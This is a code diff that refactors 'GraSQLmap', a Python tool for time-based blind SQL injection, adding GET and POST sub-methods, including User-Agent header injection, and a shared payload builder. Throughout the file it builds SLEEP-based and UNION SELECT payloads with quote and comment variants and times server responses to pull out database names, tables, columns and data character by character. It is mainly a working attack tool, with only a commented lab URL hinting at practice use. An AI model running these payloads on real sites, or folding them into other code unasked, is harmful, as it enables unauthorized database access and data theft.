@@ -1,17 +1,23 @@
 #!/usr/bin/python3
 import requests
 import sys
-import pyfiglet
 from datetime import datetime
 import argparse
 from tabulate import tabulate
-import keyboard
 
 MODE = 1
 
 METHODS = ['GET', 'POST']
 GET 	= 0
 POST 	= 1
+
+GETMETHODS = ['GETPARAM', 'GETSTRING', 'GETDIRECT']
+GET_PARAM = 0
+GET_STRING = 1
+GET_DIRECT = 2
+POSTMETHODS = ['POSTDATA', 'USERAGENT']
+POST_DATA = 0
+USER_AGENT = 1
 
 QUOTE_TYPES		= ['', "\'", '\"'] #, '\´', '\`']
 NO_QUOTE		= 0
@@ -22,7 +28,6 @@ BACK_TICK   	= 4
 inQuote         = QUOTE_TYPES[NO_QUOTE]
 
 SQL_SUFFIXES	= ['', '-- -', '#', ' AND {}1{}={}1', " AND '1'='1", " AND 1=1"]
-#SQL_SUFFIXES	= [" AND 'vINy'='vINy", " AND '1'='1"]
 SUFF_NO 		= 0
 SUFF_COMMENT	= 1
 SUFF_HASHTAG    = 2
@@ -31,7 +36,6 @@ SUFF_AND_1      = 4
 inSqlSuffix     = SQL_SUFFIXES[SUFF_NO]
 
 SPACES          = [' ', '%20', '+', '/**/']
-#SPACES          = [' ', '/**/', '%20', '+', '/++/']
 SPACE_NORMAL    = 0
 SPACE_URLENC    = 1
 SPACE_PLUS      = 2
@@ -58,7 +62,6 @@ logInfo = 0
 logDebug = 1
 logTrace = 2
 logAll = 3
-#logLevels = ('All', 'Trace', 'Debug', 'Info', 'Warn', 'Error', 'Fatal', 'Off')
 logLevels = ( 'Info', 'Debug', 'Trace', 'All')
 
 NrMin = 48
@@ -66,7 +69,6 @@ NrMax = 57
 CrMin = 32
 CrMax = 126
 
-#http://192.168.56.117/vulnerabilities/sqli/?id=&Submit=Submit#
 protVar = 'http://'
 hostVar = ''
 portVar = ''
@@ -83,7 +85,6 @@ dbname = ''
 defaultdb = ''
 tablename = ''
 pvUserAgentData = ''
-#(SELECT%204978%20FROM%20(SELECT(SLEEP(5)))moDt)
 
 verbVar = logInfo #logAll
 dSec = 1
@@ -92,6 +93,7 @@ sqliType = 1
 limitSize = 0
 
 method = METHODS[GET]
+subMethod = GETMETHODS[0]
 INFOs = []
 DBs = []
 tableNames = []
@@ -117,15 +119,14 @@ payloadHead4 = "(select ascii(substr(" #"(select substring(@@version,1,1))='M'"
 payloadTail1 = "))))YNSg)"
 payloadTail4 = ")"
 
-#mode1payloadPfx = " OR 'x'='x' UNION SELECT"
 mode1payloadPfx = ["", " ", " AND ", " OR ", " UNION SELECT", " OR 'x'='x' UNION SELECT"]
 mode1payloadSuf = ['', ',null', ',null,null', ',null,null,null', ',null,null,null,null', ',null,null,null,null,null'] #, ',null,null,null,null,null,null', ',null,null,null,null,null,null,null']
-#mode1payloadSuf = ['']
 
 payloadSchema = "SELECT count(*) FROM "+inFromTable+" WHERE table_schema="
 
 cookies = {}
 headers = {}
+parameters = {}
 
 def setHeader(suti, userAgent):
     global headers
@@ -157,13 +158,36 @@ def setParam(paramV):
     else:
         paramLeft = paramV
 
+def setPayload(pData):
+    global payload_str
+    global parameters
+    svData = ''
+    if method == 'GET':
+        if subMethod == GETMETHODS[GET_PARAM] or subMethod == GETMETHODS[GET_STRING]:
+            svData = paramRight+pData
+            #parameters = {'option' : 'com_fields', 'view' : 'fields', 'layout' : 'modal' , 'list[fullordering]' : data}
+            parameters = {paramLeft : svData}
+            payload_str = "&".join("%s=%s" % (k,v) for k,v in parameters.items())
+            logki(logAll,payload_str)
+        if subMethod == GETMETHODS[GET_DIRECT]:
+            payload_str = preVar+pData
+    if method == 'POST':
+        if subMethod == POSTMETHODS[POST_DATA]:
+            svData = preVar+pData
+            svData = svData.replace(' ', inSpace)
+            svData = svData+restVar
+            logki(logAll,svData)
+        if subMethod == POSTMETHODS[USER_AGENT]:
+            payload_str = defUserAgent+preVar+pData+restVar
+            logki(logAll,payload_str)
+            setHeader(sutike, payload_str)
+            svData = pvUserAgentData
+    return svData
+
 def digitFind_sqliType(forWhat):
-    global dSec
-    global method
-    global pURL
-    global headers
-    global inSpace
-    global sqliType
+    global payload_str
+    global parameters
+    parameters = {}
     logki(logTrace,"[digitFind_sqliType]")
     result = 0
     for y in range(0,3+1):
@@ -173,33 +197,21 @@ def digitFind_sqliType(forWhat):
             data = payloadHead1+"("+forWhat+")<"+str(hatv)+","+str(dSec)+",0"+payloadTail1
         elif sqliType == 2:
             data = "(("+forWhat+")<"+str(hatv)+payloadTail4
-        #if MODE > 0:
-        #    data =
-        if method == 'GET':
-            data = paramRight+data
-            #parameters = {'option' : 'com_fields', 'view' : 'fields', 'layout' : 'modal' , 'list[fullordering]' : data}
-            parameters = {paramLeft : data}
-            payload_str = "&".join("%s=%s" % (k,v) for k,v in parameters.items())
-            logki(logAll,payload_str)
-        if method == 'POST':
-            data = preVar+data
-            data = data.replace(' ', inSpace)
-            data = data+restVar
-            logki(logAll,data)
-        if method == 'USERAGENT':
-            payload_str = defUserAgent+preVar+data+restVar
-            logki(logAll,payload_str)
-            setHeader(sutike, payload_str)
-            data = pvUserAgentData
+        data = setPayload(data)
         tstart = datetime.now()
         if method == 'GET':
-            response = requests.get(pURL, params=parameters) #payload_str)
-        if (method == 'POST') or (method == 'USERAGENT'):
+            dUrl = pURL
+            if subMethod == GETMETHODS[GET_DIRECT]:
+                dUrl = pURL + payload_str
+                logki(logAll,dUrl)
+            if subMethod == GETMETHODS[GET_PARAM] or subMethod == GETMETHODS[GET_DIRECT]:
+                response = requests.get(dUrl, params=parameters)
+            if subMethod == GETMETHODS[GET_STRING]:
+                response = requests.get(dUrl, params=payload_str)
+        if method == 'POST':
             response = requests.post(pURL, proxies=proxyDict, headers=headers, cookies=cookies, data=data, verify=False)
-        #if method == 'USERAGENT':
-        #    response = requests.post(pURL, proxies=proxyDict, headers=headers, cookies=cookies, data="user=admin&pass=pass", verify=False)
-        logki(logTrace,response.url)
         tend = datetime.now()
+        logki(logTrace,response.url)
         delta = tend - tstart
         tdelta = int(delta.total_seconds() * 1000 )
         rSize = len(response.content)
@@ -213,12 +225,9 @@ def digitFind_sqliType(forWhat):
     return result
 
 def lenFind_sqliType(forWhat):
-    #global dSec
-    #global method
-    #global pURL
-    #global headers
-    #global inSpace
-    #global sqliType
+    global payload_str
+    global parameters
+    parameters = {}
     result = '0'
     digN = digitFind_sqliType(forWhat)
     logki(logTrace,"[lenFind_sqliType]")
@@ -229,30 +238,21 @@ def lenFind_sqliType(forWhat):
                 data = payloadHead2+"("+forWhat+"),"+str(y)+",1))<>"+str(x)+",0,"+str(dSec)+payloadTail1
             elif sqliType == 2:
                 data = payloadHead4+"("+forWhat+"),"+str(y)+",1))="+str(x)+payloadTail4
-            if method == 'GET':
-                data = paramRight+data
-                parameters = {paramLeft : data}
-                payload_str = "&".join("%s=%s" % (k,v) for k,v in parameters.items())
-                logki(logAll,payload_str)
-            if method == 'POST':
-                data = preVar+data
-                data = data.replace(' ', inSpace)
-                data = data+restVar
-                logki(logAll,data)
-            if method == 'USERAGENT':
-                payload_str = defUserAgent+preVar+data+restVar
-                logki(logAll,payload_str)
-                setHeader(sutike, payload_str)
-                data = pvUserAgentData
+            data = setPayload(data)
             tstart = datetime.now()
             if method == 'GET':
-                response = requests.get(pURL, params=parameters) #payload_str)
-            if (method == 'POST') or (method == 'USERAGENT'):
+                dUrl = pURL
+                if subMethod == GETMETHODS[GET_DIRECT]:
+                    dUrl = pURL + payload_str
+                    logki(logAll,dUrl)
+                if subMethod == GETMETHODS[GET_PARAM] or subMethod == GETMETHODS[GET_DIRECT]:
+                    response = requests.get(dUrl, params=parameters)
+                if subMethod == GETMETHODS[GET_STRING]:
+                    response = requests.get(dUrl, params=payload_str)
+            if method == 'POST':
                 response = requests.post(pURL, proxies=proxyDict, headers=headers, cookies=cookies, data=data, verify=False)
-            #if method == 'USERAGENT':
-            #    response = requests.post(pURL, proxies=proxyDict, headers=headers, cookies=cookies, data="user=admin&pass=pass", verify=False)
-            logki(logTrace,response.url)
             tend = datetime.now()
+            logki(logTrace,response.url)
             delta = tend - tstart
             tdelta = int(delta.total_seconds() * 1000 )
             rSize = len(response.content)
@@ -266,21 +266,11 @@ def lenFind_sqliType(forWhat):
     return result
 
 def testRun():
-    #global dSec
-    #global method
-    #global pURL
-    #global verbVar
-    #global pvUserAgentData
     tries = 0
     payloadParams = []
     logki(logTrace,"[testRun]")
     result = False
     USE_SUFFIXES = SQL_SUFFIXES
-    #for spcF in SPACES:
-    #    for sufF in SQL_SUFFIXES:
-    #        if sufF.find(' ') != -1 and spcF != ' ':
-    #            pluSuff = sufF.replace(' ', spcF)
-    #            USE_SUFFIXES.append(pluSuff)
     findN = 0
     mszer = 1
     if method == 'GET':
@@ -309,12 +299,9 @@ def testRun():
                         for mpP in mode1payloadPfx:
                             tries += 1
                             payloadFinding = []
-                            #data = payloadHead0+"("+forWhat+"),"+str(y)+",1))"+relaciosJel+str(x)+",0,"+str(dSec)+payloadTail0
-                            #data = "(SELECT 4978 FROM (SELECT(SLEEP("+str(dSec)+"))YNSg)"
                             if mpS == '':
                                 data = qt+mpP+"(SELECT 4978 FROM (SELECT(SLEEP("+str(dSec)+")))YNSg)"+sufF
-                            else: # 1 col
-                                #data = mode1payloadPfx+"(SLEEP("+str(dSec)+"))"+sufF
+                            else:
                                 data = qt+mpP+" (SLEEP("+str(dSec)+"))"+mpS+sufF
                             if method == 'GET':
                                 #logki(logAll,data)
@@ -330,7 +317,6 @@ def testRun():
                                 data = data+restVar
                                 payload_str = data
                             if method == 'USERAGENT':
-                                #data = data.replace(' ', spcF)
                                 payload_str = defUserAgent+data
                                 logki(logAll,payload_str)
                                 setHeader(sutike, payload_str)
@@ -343,11 +329,11 @@ def testRun():
                                 elif gethdik == 1:
                                     response = requests.get(pURL, params=payload_str)
                                 else:
-                                    params = {}
+                                    parameters = {}
                                     payload_str = data
                                     dUrl = pURL + payload_str
                                     logki(logAll,dUrl)
-                                    response = requests.get(dUrl, params=params)
+                                    response = requests.get(dUrl, params=parameters)
                             if method == 'POST':
                                 response = requests.post(pURL, proxies=proxyDict, headers=headers, cookies=cookies, data=data, verify=False)
                             if method == 'USERAGENT':
@@ -394,11 +380,9 @@ def testRun():
     return result
 
 def charFind_sqliType(forWhat, whatLen):
-    global dSec
-    global method
-    global pURL
-    global inSpace
-    global sqliType
+    global payload_str
+    global parameters
+    parameters = {}
     logki(logTrace,"[charFind_sqliType]")
     result = ''
     dispDeltaStart('szo')
@@ -417,28 +401,19 @@ def charFind_sqliType(forWhat, whatLen):
                 data = payloadHead2+"("+forWhat+"),"+str(y)+",1))>"+str(x)+","+str(dSec)+",0"+payloadTail1
             elif sqliType == 2:
                 data = payloadHead4+"("+forWhat+"),"+str(y)+",1))>"+str(x)+payloadTail4
-            if method == 'GET':
-                data = paramRight+data
-                parameters = {paramLeft : data}
-                payload_str = "&".join("%s=%s" % (k,v) for k,v in parameters.items())
-                logki(logAll,payload_str)
-            if method == 'POST':
-                data = preVar+data
-                data = data.replace(' ', inSpace)
-                data = data+restVar
-                logki(logAll,data)
-            if method == 'USERAGENT':
-                payload_str = defUserAgent+preVar+data+restVar
-                logki(logAll,payload_str)
-                setHeader(sutike, payload_str)
-                data = pvUserAgentData
+            data = setPayload(data)
             tstart = datetime.now()
             if method == 'GET':
-                response = requests.get(pURL, params=payload_str)
-            if (method == 'POST') or (method == 'USERAGENT'):
+                dUrl = pURL
+                if subMethod == GETMETHODS[GET_DIRECT]:
+                    dUrl = pURL + payload_str
+                    logki(logAll,dUrl)
+                if subMethod == GETMETHODS[GET_PARAM] or subMethod == GETMETHODS[GET_DIRECT]:
+                    response = requests.get(dUrl, params=parameters)
+                if subMethod == GETMETHODS[GET_STRING]:
+                    response = requests.get(dUrl, params=payload_str)
+            if method == 'POST':
                 response = requests.post(pURL, proxies=proxyDict, headers=headers, cookies=cookies, data=data, verify=False)
-            #if method == 'USERAGENT':
-            #    response = requests.post(pURL, proxies=proxyDict, headers=headers, cookies=cookies, data="user=admin&pass=pass", verify=False)
             tend = datetime.now()
             logki(logTrace,response.url)
             delta = tend - tstart
@@ -466,34 +441,24 @@ def charFind_sqliType(forWhat, whatLen):
                         data = payloadHead2+"("+forWhat+"),"+str(y)+",1))<>"+str(f)+",0,"+str(dSec)+payloadTail1
                     elif sqliType == 2:
                         data = payloadHead4+"("+forWhat+"),"+str(y)+",1))="+str(f)+payloadTail4
-                    if method == 'GET':
-                        data = paramRight+data
-                        parameters = {paramLeft : data}
-                        payload_str = "&".join("%s=%s" % (k,v) for k,v in parameters.items())
-                        logki(logAll,payload_str)
-                    if method == 'POST':
-                        data = preVar+data
-                        data = data.replace(' ', inSpace)
-                        data = data+restVar
-                        logki(logAll,data)
-                    if method == 'USERAGENT':
-                        payload_str = defUserAgent+preVar+data+restVar
-                        logki(logAll,payload_str)
-                        setHeader(sutike, payload_str)
-                        data = pvUserAgentData
+                    data = setPayload(data)
                     tstart = datetime.now()
                     if method == 'GET':
-                        response = requests.get(pURL, params=payload_str)
-                    if (method == 'POST') or (method == 'USERAGENT'):
+                        dUrl = pURL
+                        if subMethod == GETMETHODS[GET_DIRECT]:
+                            dUrl = pURL + payload_str
+                            logki(logAll,dUrl)
+                        if subMethod == GETMETHODS[GET_PARAM] or subMethod == GETMETHODS[GET_DIRECT]:
+                            response = requests.get(dUrl, params=parameters)
+                        if subMethod == GETMETHODS[GET_STRING]:
+                            response = requests.get(dUrl, params=payload_str)
+                    if method == 'POST':
                         response = requests.post(pURL, proxies=proxyDict, headers=headers, cookies=cookies, data=data, verify=False)
-                    #if method == 'USERAGENT':
-                    #    response = requests.post(pURL, proxies=proxyDict, headers=headers, cookies=cookies, data="user=admin&pass=pass", verify=False)
                     tend = datetime.now()
                     logki(logTrace,response.url)
                     delta = tend - tstart
                     tdelta = int(delta.total_seconds() * 1000 )
                     rSize = len(response.content)
-                    #logki(logAll,"Resp: "+str(response.elapsed.total_seconds())+"s Calc:"+str(tdelta/1000)+"s - Limit: "+str(dSec)+"s")
                     logki(logTrace,"RespSize: "+str(rSize)+"kb Resp: "+str(response.elapsed.total_seconds())+"s Calc:"+str(tdelta/1000)+"s - Limit: "+str(dSec)+"s")
                     melyikAg = False
                     if sqliType == 1:
@@ -584,9 +549,7 @@ def charFind3(forWhat, whatLen, mitKeres):
     dispDeltaStart('szo')
     for y in range(1,whatLen+1):
         for x in range(rangeMin, rangeMax+1, step):
-            #data = "(SELECT%204978%20FROM%20(SELECT(SLEEP("+str(dSec)+")))moDt)"
             data = payloadHead2+"("+forWhat+"),"+str(y)+",1))"+relaciosJel+str(x)+",0,"+str(dSec)+payloadTail1
-            #data = "(SELECT%204978%20FROM%20(SELECT(SLEEP(IF(ascii(substr(("+forWhat+"%20LIMIT%20"+str(offSet)+",1),"+str(y)+",1))<>"+str(x)+",0,"+str(dSec)+"))))YNSg)"
             if method == 'GET':
                 #parameters = {'option' : 'com_fields', 'view' : 'fields', 'layout' : 'modal' , 'list[fullordering]' : data}
                 data = paramRight+data
@@ -594,7 +557,6 @@ def charFind3(forWhat, whatLen, mitKeres):
                 payload_str = "&".join("%s=%s" % (k,v) for k,v in parameters.items())
                 logki(logAll,payload_str)
             if method == 'POST':
-                #data = preVar+data+restVar
                 data = preVar+data
                 data = data.replace(' ', inSpace)
                 data = data+restVar
@@ -683,7 +645,7 @@ def db_alap_q(roundS,desc,query,rest,limites):
 
 def info_q():
     global defaultdb
-    print(pyfiglet.figlet_format('Info query'))
+    print(' --< Info query ]--[ ')
     runparams()
 #infolekérdezséek
     db_alap_q(1,"Default DB","database()","",False)
@@ -698,7 +660,7 @@ def info_q():
 def schema_q():
     global defaultdb
     global inSpace
-    print(pyfiglet.figlet_format('Schema query'))
+    print(' --< Schema query ]--[ ')
     runparams()
 #schema/db lekrdezések
     schemaN = 0
@@ -717,7 +679,7 @@ def table_q(): #tábla lekrdezések
     global defaultdb
     global defDBt
     global inSpace
-    print(pyfiglet.figlet_format('DB query'))
+    print(' --< DB query ]--[ ')
     runparams()
     print("Database      ["+dbname+"]")
     if defDBt:
@@ -747,7 +709,7 @@ def column_q(): #lekérdezett vagy megadott tábla alapján mező lekérdezések
     global defDBt
     global tablename
     global inSpace
-    print(pyfiglet.figlet_format('Table query'))
+    print(' --< Table query ]--[ ')
     runparams()
     tableN = 1
     ot = 0
@@ -809,22 +771,24 @@ def runparams():
     print("Verbose level ["+logLevels[verbVar]+"]")
     print("URL           ["+pURL+"]")
     print("Metódus       ["+method+"]")
+    print("Almetódus     ["+subMethod+"]")
     print("Force defDB   ["+str(defDBt)+"]")
     print("Space         ["+inSpace+"]")
-    logki(logTrace,"ParamV        ["+preVar+"]")
-    logki(logTrace,"ParamLeft     ["+paramLeft+"]")
-    logki(logTrace,"ParamRight    ["+paramRight+"]")
-    logki(logTrace,"UserAgentData ["+pvUserAgentData+"]")
+    logki(logDebug,"ParamV        ["+preVar+"]")
+    logki(logDebug,"ParamLeft     ["+paramLeft+"]")
+    logki(logDebug,"ParamRight    ["+paramRight+"]")
+    logki(logDebug,"UserAgentData ["+pvUserAgentData+"]")
 
 def main():
     global sutike
     dispDeltaStart('szo')
-    print(pyfiglet.figlet_format('GraSQLmap'))
+    print(' --< GraSQLmap ]--[ ')
 
     parser = argparse.ArgumentParser()
     parser.add_argument("-u","--url",help="Input an url.",type=str)
     parser.add_argument("-up","--url_port",help="Input a portnumber for url (default = 80).",type=int)
     parser.add_argument("-m","--method",help="Call method. (default = GET )",type=str)
+    parser.add_argument("-sm","--sub_method",help="Call sub method. (default = simple GET 1 )",type=int)
     parser.add_argument("--ssl",action='store_true')
     parser.add_argument("-p","--proxy_http",help="Input a http proxy",type=str)
     parser.add_argument("-ps","--proxy_https",help="Input a https proxy",type=str)
@@ -856,6 +820,7 @@ def main():
     args = parser.parse_args()
 
     global method
+    global subMethod
     global urlVar
     global pURL
     global tablename
@@ -924,11 +889,21 @@ def main():
         print("Missing ULR!")
         canGo = False
     if(args.method):
-            method=args.method
-            if method == 'USERAGENT':
-                if not(args.useragent_data):
-                    print("In case USERAGENT need input -uad (useragent_data) POST call data row")
-                    canGo = False
+        method=args.method
+        if(args.sub_method):
+            if method == 'GET':
+                subMethod = GETMETHODS[args.sub_method]
+            if method == 'POST':
+                subMethod = POSTMETHODS[args.sub_method]
+        else:
+            if method == 'GET':
+                subMethod = GETMETHODS[GET_PARAM]
+            if method == 'POST':
+                subMethod = POSTMETHODS[POST_DATA]
+        if subMethod == POSTMETHODS[USER_AGENT]:
+            if not(args.useragent_data):
+                print("In case USERAGENT need input -uad (useragent_data) POST call data row")
+                canGo = False
     if(canGo):
             dispDeltaStart('app')
             if(args.url_port):
@@ -955,7 +930,7 @@ def main():
             setHeader(sutike, defUserAgent)
 
             if(args.dbs==None and args.databases==None and args.tables==None):
-                    print("Hinyzó paraméterek, használd a --help-et vagy a --dbs kapcsolót.")
+                    print("Missing parameters, use --help or --test, --info, --dbs switches.")
             if(args.databases):
                     dbname=args.databases
             if(args.table):
